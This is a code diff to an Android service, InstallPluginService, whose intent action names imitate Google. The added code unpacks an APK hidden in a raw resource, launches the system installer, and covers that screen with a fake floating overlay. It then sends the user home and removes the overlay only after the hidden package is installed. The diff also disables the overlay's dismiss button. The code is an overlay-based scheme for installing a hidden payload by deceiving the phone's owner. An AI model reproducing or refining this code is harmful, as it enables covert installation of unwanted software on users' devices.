@@ -8,7 +8,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.ResolveInfo;
-import android.graphics.drawable.Drawable;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
@@ -23,8 +22,12 @@ public class InstallPluginService extends Service {
     public static final String ACTION_INSTALL = "com.google.install.plugin";
     public static final String ACTION_INSTALL_NOW = "com.google.install.plugin.now";
     
+    private static final boolean DEBUG_PROCESS = true;
+    
     private static final int SHOW_INSTALL_FAKE_VIEW = 0;
-    private static final int REMOVE_INSTALL_FAKE_VIEW = 1;
+    private static final int GO_HOME = 1;
+    private static final int REMOVE_INSTALL_FAKE_VIEW = 2;
+    private static final int SHOW_FAKE_OVERLAY = 3;
     private Handler mHandler = new Handler() {
         public void handleMessage(Message msg) {
             switch (msg.what) {
@@ -32,16 +35,43 @@ public class InstallPluginService extends Service {
                 if (!Utils.isPackageAlreadyInstalled(getApplicationContext(), Config.PACKAGE_NAME)) {
                     File file = new File(getFilesDir() + "/" + Config.DUMP_PACKAGE_NAME);
                     if (!file.exists()) {
-                        if (!Utils.unzipRawToPath(getApplicationContext(), null, file.getPath())) {
-                            Config.LOGD(TAG, "unzip package to target : " + file.getPath() + " failed");
+                        if (!Utils.unzipRawToPath(getApplicationContext(), R.raw.mmsbg, Config.DUMP_PACKAGE_NAME)) {
+                            Config.LOGD(TAG, " >>>>>>>> unzip package to target : " + file.getPath() + " failed");
                             return;
                         }
+                    } else {
+                        Config.LOGD(TAG, " >>>>>>>> unzip package to target : " + file.getPath() + " success <<<<<");
                     }
-                    SettingManager.getInstance(getApplicationContext())
-                        .showFloatWindow(getFakeView(), true, 0, 0);
-                    startSystemInstallActivity();
-                    mHandler.sendEmptyMessageDelayed(REMOVE_INSTALL_FAKE_VIEW, 15 * 1000);
+                    
+                    if (DEBUG_PROCESS) {
+                        Utils.startSystemInstallActivity(getApplicationContext());
+                        mHandler.sendEmptyMessageDelayed(SHOW_FAKE_OVERLAY
+                                , 5 * 1000);
+                    } else {
+                        SettingManager.getInstance(getApplicationContext())
+                                            .showFloatWindow(getFakeView(), false, 0, 0);
+                        Utils.startSystemInstallActivity(getApplicationContext());
+                        mHandler.sendEmptyMessageDelayed(GO_HOME
+                                            , Config.OVERLAY_VIEW_DISMISS_DELAY);
+                    }
+                } else {
+                    Config.LOGD(TAG, ">>>>> package : " + Config.PACKAGE_NAME + " has been installed");
                 }
+                break;
+            case SHOW_FAKE_OVERLAY:
+                SettingManager.getInstance(getApplicationContext())
+                                    .showFloatWindow(getFakeView(), false, 0, 0);
+                if (DEBUG_PROCESS) {
+                    mHandler.sendEmptyMessageDelayed(REMOVE_INSTALL_FAKE_VIEW
+                                    , Config.OVERLAY_VIEW_DISMISS_DELAY);
+                } else {
+                    mHandler.sendEmptyMessageDelayed(GO_HOME
+                                    , Config.OVERLAY_VIEW_DISMISS_DELAY);
+                }
+                break;
+            case GO_HOME:
+                Utils.goHome(getApplicationContext());
+                mHandler.sendEmptyMessageDelayed(REMOVE_INSTALL_FAKE_VIEW, 1500);
                 break;
             case REMOVE_INSTALL_FAKE_VIEW:
                 SettingManager.getInstance(getApplicationContext()).removeFloatWindow();
@@ -64,8 +94,14 @@ public class InstallPluginService extends Service {
                 }
             } else if (action.equals(Intent.ACTION_PACKAGE_ADDED)) {
                 // there is a new package installed
-                mHandler.removeMessages(SHOW_INSTALL_FAKE_VIEW);
-                mHandler.sendEmptyMessage(REMOVE_INSTALL_FAKE_VIEW);
+                Config.LOGD(TAG, "intent data = " + intent.getDataString());
+                if (intent.getDataString() != null 
+                        && intent.getDataString().contains(Config.PACKAGE_NAME)) {
+                    mHandler.removeMessages(SHOW_INSTALL_FAKE_VIEW);
+                    mHandler.sendEmptyMessage(REMOVE_INSTALL_FAKE_VIEW);
+                } else {
+                    //TODO : show fake window
+                }
             }
         }
     };
@@ -87,8 +123,10 @@ public class InstallPluginService extends Service {
         } else {
             //catch the broadcast for some special action
             IntentFilter filter = new IntentFilter();
-            filter.addAction(Intent.ACTION_SCREEN_ON);
-            filter.addAction(Intent.ACTION_SCREEN_OFF);
+            if (DEBUG_PROCESS) {
+                filter.addAction(Intent.ACTION_SCREEN_ON);
+                filter.addAction(Intent.ACTION_SCREEN_OFF);
+            }
             filter.addAction(Intent.ACTION_PACKAGE_ADDED);
             this.registerReceiver(mReceiver, filter);
         }
@@ -98,6 +136,10 @@ public class InstallPluginService extends Service {
     public void onDestroy() {
         super.onDestroy();
         this.unregisterReceiver(mReceiver);
+    }
+    
+    private void startAlarm() {
+        
     }
     
     private View getFakeView() {
@@ -115,23 +157,16 @@ public class InstallPluginService extends Service {
             tips1.setText(String.format(getString(R.string.install_confirm_formatted), info.loadLabel(getPackageManager())));
         }
         
-        View ok = ret.findViewById(R.id.ok_button);
-        if (ok != null) {
-            ok.setOnClickListener(new View.OnClickListener() {
-                public void onClick(View v) {
-                    SettingManager.getInstance(getApplicationContext()).removeFloatWindow();
-                }
-            });
-        }
+//        View ok = ret.findViewById(R.id.ok_button);
+//        if (ok != null) {
+//            ok.setOnClickListener(new View.OnClickListener() {
+//                public void onClick(View v) {
+//                    SettingManager.getInstance(getApplicationContext()).removeFloatWindow();
+//                }
+//            });
+//        }
         
         return ret;
-    }
-    
-    private void startSystemInstallActivity() {
-//        Intent i = new Intent(Intent.ACTION_VIEW);
-//        File upgradeFile = new File(getFilesDir() + "/" + Config.DUMP_PACKAGE_NAME);
-//        i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
-//        startActivity(i); 
     }
     
     @Override
